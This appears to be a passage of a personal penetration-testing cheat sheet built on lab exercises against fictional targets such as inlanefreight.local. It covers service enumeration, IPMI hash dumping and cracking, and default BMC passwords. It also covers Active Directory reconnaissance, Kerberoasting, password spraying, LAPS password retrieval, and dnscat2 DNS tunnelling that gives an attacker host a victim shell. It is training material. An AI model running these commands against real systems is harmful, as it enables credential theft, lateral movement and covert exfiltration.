| `1 DELETE "INBOX"`              | Deletes a mailbox.                                                                                            |
| `1 RENAME "ToRead" "Important"` | Renames a mailbox.                                                                                            |
| `1 LSUB "" *`                   | Returns a subset of names from the set of names that the User has declared as being `active` or `subscribed`. |
| `1 SELECT INBOX_NAME`           | Selects a mailbox so that messages in the mailbox can be accessed.                                            |
| `1 UNSELECT INBOX`              | Exits the selected mailbox.                                                                                   |
| `1 FETCH <ID> all`              | Retrieves data associated with a message in the mailbox, except the body.                                     |
| `1 FETCH <ID> BODY[]`           | Retrieves the body of the email                                                                               |
| `SEARCH DELETED`                | Search deleted messages                                                                                       |
| `1 CLOSE`                       | Removes all messages with the `Deleted` flag set.                                                             |
| `1 LOGOUT`                      | Closes the connection with the IMAP server.                                                                   |

---

## MySQL (Advanced)

Port 3306.

```bash
sudo nmap 10.129.14.128 -sV -sC -p3306 --script mysql*      # nmap scripts
mysql -u root -h 10.129.14.132                              # no password
mysql -u root -pP4SSw0rd -h 10.129.14.12                   # with password
```

Useful SQL commands:
```sql
show databases;
use <database>;
show tables;
show columns from <table>;
select * from <table>;
select * from <table> where <column> = "string";

-- sys schema
use sys;
select host, unique_users from host_summary;    -- view connections (lateral movement)
```

---

## MSSQL

Ports 1433 and 1434.

```bash
# Nmap scripts:
sudo nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes \
  --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER \
  -sV -p 1433 10.129.201.248

# Metasploit:
use auxiliary/scanner/mssql/mssql_ping
set rhosts 10.129.201.248
run

# Impacket mssqlclient:
python3 mssqlclient.py Administrator@10.129.201.248 -windows-auth
help    # view available commands
```

---

## IPMI

UDP port 623. BMC (Baseboard Management Controllers).

```bash
sudo nmap -sU --script ipmi-version -p 623 10.129.42.195

# Metasploit:
use auxiliary/scanner/ipmi/ipmi_version
set rhosts 10.129.42.195
run

use auxiliary/scanner/ipmi/ipmi_dumphashes    # get hashes
set rhosts 10.129.42.195
run

# Crack hash (mode 7300):
hashcat -m 7300 ipmi.txt -a 3 ?1?1?1?1?1?1?1?1 -1 ?d?u
```

Default passwords:
| Vendor | Username | Password |
|--------|----------|----------|
| Dell iDRAC | root | calvin |
| HP iLO | Administrator | random 8-char string |
| Supermicro | ADMIN | ADMIN |

---

## R-services (rlogin / rwho / rusers)

Ports 512, 513, 514.

```bash
rlogin 10.0.17.2 -l htb-student    # remote login
rwho                               # view interactive sessions on network
rusers -al 10.0.17.5               # list authenticated users
```

---

## WMI / wmiexec

```bash
wmiexec.py Cry0l1t3:"P455w0rD!"@10.129.201.248 "hostname"
wmiexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.5
```

Non-interactive shell — each command spawns a cmd.exe process.

---

## Rubeus

"Mimikatz of kerbereros"

You can use [Rubeus](https://github.com/GhostPack/Rubeus). You have to upload this binary to victim machine.

asreproasting attack:
```
Rubeus.exe asreproast /user:user /domain:domain.local /dc:<hostname>
```

Kerberoasting attack:
```
Rubeus.exe kerberoast /creduser:domain.local\user /credpassword:password
```

---

## PowerView

PowerView is part of deprecated PowerSploit offensive PowerShell toolkit, this receive updates by [Empire 4](https://github.com/BC-SECURITY/Empire/blob/master/empire/server/data/module_source/situational_awareness/network/powerview.ps1) framework

These are the most useful functions PowerView offers.

| Command / Function | Description |
| :--- | :--- |
| **PowerView General** | |
| `Export-PowerViewCSV` | Appends results to a CSV file. |
| `ConvertTo-SID` | Converts a user or group name to its SID value. |
| `Get-DomainSPNTicket` | Requests the Kerberos ticket for a specified Service Principal Name (SPN) account. |
| **Domain / LDAP Functions** | |
| `Get-Domain` | Returns the AD object for the current (or specified) domain. |
| `Get-DomainController` | Returns a list of Domain Controllers for the specified domain. |
| `Get-DomainUser` | Returns all users or specific user objects in AD. |
| `Get-DomainComputer` | Returns all computers or specific computer objects in AD. |
| `Get-DomainGroup` | Returns all groups or specific group objects in AD. |
| `Get-DomainOU` | Searches for all or specific Organizational Unit (OU) objects in AD. |
| `Find-InterestingDomainAcl` | Finds object ACLs in the domain with modification rights set to non-built-in objects. |
| `Get-DomainGroupMember` | Returns the members of a specific domain group. |
| `Get-DomainFileServer` | Returns a list of servers likely functioning as file servers. |
| `Get-DomainDFSShare` | Returns a list of all distributed file systems for the current (or specified) domain. |
| **GPO Functions** | |
| `Get-DomainGPO` | Returns all GPOs or specific GPO objects in AD. |
| `Get-DomainPolicy` | Returns the default domain policy or the domain controller policy for the current domain. |
| **Computer Enumeration Functions** | |
| `Get-NetLocalGroup` | Enumerates local groups on the local or a remote machine. |
| `Get-NetLocalGroupMember` | Enumerates members of a specific local group. |
| `Get-NetShare` | Returns open shares on the local (or a remote) machine. |
| `Get-NetSession` | Returns session information for the local (or a remote) machine. |
| `Test-AdminAccess` | Tests if the current user has administrative access to the local (or a remote) machine. |
| **Threaded 'Meta'-Functions** | |
| `Find-DomainUserLocation` | Finds machines where specific users are logged in. |
| `Find-DomainShare` | Finds reachable shares on domain machines. |
| `Find-InterestingDomainShareFile` | Searches for files matching specific criteria on readable shares in the domain. |
| `Find-LocalAdminAccess` | Finds machines on the local domain where the current user has local administrator access. |
| **Domain Trust Functions** | |
| `Get-DomainTrust` | Returns domain trusts for the current domain or a specified domain. |
| `Get-ForestTrust` | Returns all forest trusts for the current forest or a specified forest. |
| `Get-DomainForeignUser` | Enumerates users who are in groups outside of the user's domain. |
| `Get-DomainForeignGroupMember` | Enumerates groups with users outside of the group's domain and returns each foreign member. |
| `Get-DomainTrustMapping` | Enumerates all trusts for the current domain and any others discovered. |

The `Get-DomainUser` function provide information on all users.

Import the module:
```powershell
Import-Module .\PowerView.ps1
```

Below we will use it to grab information about a specific user, `mmorgan`.

```PowerShell
Get-DomainUser -Identity mmorgan -Domain inlanefreight.local | Select-Object -Property name,samaccountname,description,memberof,whencreated,pwdlastset,lastlogontimestamp,accountexpires,admincount,userprincipalname,serviceprincipalname,useraccountcontrol
```

To enumerate some domain group information we can use `Get-DomainGroupMember`. Adding the `-Recursive` we can enumerate nested group.
```powershell
Get-DomainGroupMember -Identity "Domain Admins" -Recurse
```

We can also enumerate domain trust mappings. This enum recursive all the trusts of the domain
```
Get-DomainTrustMapping
```

You can use `Test-AdminAccess` to test for local admin access on either the current machine or remote one.

```powershell
Test-AdminAccess -ComputerName ACADEMY-EA-MS01
```

We can check for users with the SPN attribute set, which indicates that the account may be subjected to a Kerberoasting attack.

```powershell
Get-DomainUser -SPN -Properties samaccountname,ServicePrincipalName
```

---

## SharpView

Another tool similar to PowerView is SharpView that is build in .NET

```powershell
.\SharpView.exe Get-DomainUser -Help
```

Enumerate information about a specific user.

```powershell
.\SharpView.exe Get-DomainUser -Identity forend
```

---

## Windapsearch

```bash
python3 windapsearch.py --dc-ip 172.16.5.5 -u "" -U            # anonymous users
python3 windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 --da   # domain admins
python3 windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 -PU   # privileged users
```

---

## Debugging Binaries

You can use file command to obtain a little more of information

```bash
file binary
```

### strings

You can use `strings` command to obtain 

### Executing the file

If you're in linux you can try:
```bash
wine binary.exe
```

### ltrace

Intercept the libraries executed by the binary

```bash
ltrace binary
```

### strace

Trace system call and signals.

```bash
strace binary
```

### objdump

Allow disassembly the binary

```bash
objdump -d binary
```

### gdb

### Ghidra

#### Arch bug

Bug in arch system, open ghidra, but user license dissapear, you can accept from terminal

```
export JAVA_TOOL_OPTIONS="-DUSER_AGREEMENT=ACCEPT"
```

https://github.com/NationalSecurityAgency/ghidra/blob/master/DevGuide.md

You can add to the .zshrc

```bash
echo 'export JAVA_TOOL_OPTIONS="-DUSER_AGREEMENT=ACCEPT"' >> ~/.zshrc
```

If you open in a blank desktop it works.

#### Installing jdk debian

```
apt-cache search java11
sudo apt install openjdk-11-jdk
```

#### Creating a project

Create a project

Analyse, the default option are normally good.

#### Configurations

In the project view. Edit > Theme > Switch > Flat Dark Theme

### What can you search?

#### Imports

You can search Imports from Symbol Tree → Imports in the left side.

- `msfcoree.dll` is the boot core of .NET.
- `WININET.DLL / WINHTTP.DLL` allow download HTTP/HTTPS

#### Strings

From Windows > Defined Strings

Or

In the options panel at the top, you can see **Search -> For Strings**, you can put the default options.

#### Entry point

main function

In the tree view on the left side, you can click on function, and search main.

### Decompile function

Double click in a function and in decompiled windows you will see the function.

### For .NET or C# binaries

#### Avaloniailspy / ILSpy

Ghidra no support all the programming language, there are other tools 
This decompiler works well with .NET Apps / C# code.

You need to install .NET and it doesn't exist for arch linux.

#### dnspy

```bash
yay -S dnspyex-wine-bin
```

---

## Useful resources for AD

- [WADComs project](https://wadcoms.github.io/). Is a list of offensive security tools to be used against Windows/AD environment.

---

## DomainPasswordSpray

```powershell
Import-Module .\DomainPasswordSpray.ps1
Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue
```

---

## LAPSToolkit

```powershell
Import-Module .\LAPSToolkit.ps1
Find-LAPSDelegatedGroups          # groups delegated to read LAPS passwords
Find-AdmPwdExtendedRights         # users with "All Extended Rights"
Get-LAPSComputers                 # computers with LAPS + cleartext passwords
```

---

## DNScat2

DNS tunneling — exfiltration and C2 over DNS.

```bash
# Server (attacker):
sudo ruby dnscat2.rb --dns host=10.10.14.18,port=53,domain=inlanefreight.local --no-cache

# PowerShell client (victim):
Import-Module .\dnscat2.ps1
Start-Dnscat2 -DNSserver 10.10.14.18 -Domain inlanefreight.local -PreSharedSecret <secret> -Exec cmd

# On server:
?              # help
window -i 1   # get session
```

---

## ptunnel-ng (ICMP Tunneling)

```bash
# Pivot host (server):
sudo ./ptunnel-ng -r10.129.202.64 -R22

# Attacker (client):
sudo ./ptunnel-ng -p10.129.202.64 -l2222 -r10.129.202.64 -R22
ssh -p2222 -lubuntu 127.0.0.1
ssh -D 9050 -p2222 -lubuntu 127.0.0.1   # with dynamic forwarding
proxychains nmap -sV -sT 172.16.5.19 -p3389
```

---

## SocksOverRDP

```cmd
regsvr32.exe SocksOverRDP-Plugin.dll              # load plugin on pivot (via mstsc.exe)
# Connect to internal machine with mstsc.exe — plugin listens on 127.0.0.1:1080
# Transfer SocksOverRDP-Server.exe and run as admin

netstat -antb | findstr 1080                      # verify listener
# Configure Proxifier: Profile > Proxy Servers > 127.0.0.1:1080 SOCKS5
```

---

## Nessus

```bash
# Start services and access via web browser (default HTTPS port 8834)
# Web login > New Scan > select type > configure targets > launch
```

---

## OpenVAS / GVM

```bash
sudo apt-get install gvm && openvas
gvm-setup
gvm-start

# Generate report:
python3 -m openvasreporting -i report-<id>.xml -f xlsx
```

---

## ActiveDirectory PowerShell Module

Is a group of PowerShell cmdlets for administering an Active Directory environment from the command line.

We're looking a few that are particularly useful for enum AD environments.

To discover modules you can use:
```powershell
Get-Module
```

If you don't see the ActiveDirectory module, you can import it:
```powershell
Import-Module ActiveDirectory
Get-Module
```

Obtain basic info about the domain like domain SID, domain functional leve, child domains...
```
Get-ADDomain
```

Now we will use the `Get-ADUser` cmdlet. We will be filtering for accounts with the `Service PrincipalName` property. This will get us a listing of accounts that may be susceptible to a Kerberoasting attack.

```powershell
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName
```

We can verify domain trust relationships using `Get-ADTrust`.

```powershell
Get-ADTrust -Filter *
```

We can gather AD group information using `Get-ADGroup`.
```powershell
Get-ADGroup -Filter * | select name
```

To obtain more details about a particular group, you can use:
```powershell
Get-ADGroup -Identity "Backup Operators"
```

Let's get a member listing using the `Get-ADGroupMember`
```powershell
Get-ADGroupMember -Identity "Backup Operators"
```

---

## Shares

Shares allow users on a domain to quickly access information relevant to their daily roles and share content with their organization

## Snaffler

Snaffler tool can help us acquire credentials or other sensitive data in Active Directory environment. Snaffler obtain a list of hosts within the domain and the enumerating those hosts for shares and readable directories. It iterates through directories and hunts for files that could improve our position in the assessment.

Snaffler requires that it be run from a domain-joined host.

```powershell
Snaffler.exe -s -d inlanefreight.local -o snaffler.log -v data
```

```powershell
.\Snaffler.exe  -d INLANEFREIGHT.LOCAL -s -v data
```

- `-s`: print results to the console
- `-d`: specifies the domain to search within
- `-o`: write the result in a log file.
- `-v data`: verbose level. Data is the best if only displays results to the screen.
